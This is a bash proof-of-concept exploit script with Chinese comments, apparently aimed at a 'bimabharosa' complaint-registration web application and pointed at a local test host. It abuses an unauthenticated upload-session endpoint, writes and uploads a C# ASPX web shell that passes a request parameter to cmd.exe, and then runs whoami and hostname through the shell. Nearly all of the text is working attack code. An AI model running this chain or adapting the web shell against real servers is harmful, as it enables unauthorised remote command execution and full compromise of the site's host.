#!/bin/bash
# Fixed version - no CRLF, direct run
# Usage: bash bimabharosa_fixed.sh

set -u

D=test.a
H=127.0.0.1
WORKDIR="$(cd "$(dirname "$0")" && pwd)"
cd "$WORKDIR" || exit 1

echo "[*] workdir: $WORKDIR"
echo "[*] target : https://$D -> $H"
echo

# ---------- 1) 未鉴权设置上传会话 ----------
echo "[*] step 1: set upload session"
curl -sk -c cj.txt --resolve "$D:443:$H" -X POST \
  "https://$D/RegComplaint/SetPath" \
  -H "Content-Type: application/json" \
  --data '{"MobileNum":"8888888888"}'
echo
echo

# ---------- 2) 生成并上传 webshell ----------
echo "[*] step 2: create shell.aspx"
cat > shell.aspx <<'EOF2'
<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(){
  string c=Request["c"];
  if(c!=null){
    System.Diagnostics.Process p=new System.Diagnostics.Process();
    p.StartInfo.FileName="cmd.exe";
    p.StartInfo.Arguments="/c "+c;
    p.StartInfo.UseShellExecute=false;
    p.StartInfo.RedirectStandardOutput=true;
    p.StartInfo.RedirectStandardError=true;
    p.Start();
    Response.Write("OUT:"+p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd());
  }
}
</script>
EOF2

echo "[*] step 2: upload shell.aspx"
P=$(curl -sk -b cj.txt --resolve "$D:443:$H" -X POST \
      "https://$D/RegComplaint/UploadFiles" \
      -F "shell.aspx=@shell.aspx" | tr -d '"\r\n')
echo "uploaded dir: [$P]"
echo

if [ -z "$P" ]; then
  echo "[!] upload failed, P is empty, abort."
  exit 1
fi

# ---------- 3) 执行命令 ----------
echo "[*] step 3: run whoami"
curl -sk --resolve "$D:443:$H" "https://$D/TempFiles/$P/shell.aspx?c=whoami"
echo
echo

echo "[*] step 3: run hostname"
curl -sk --resolve "$D:443:$H" "https://$D/TempFiles/$P/shell.aspx?c=hostname"
echo
echo

echo "[*] done."
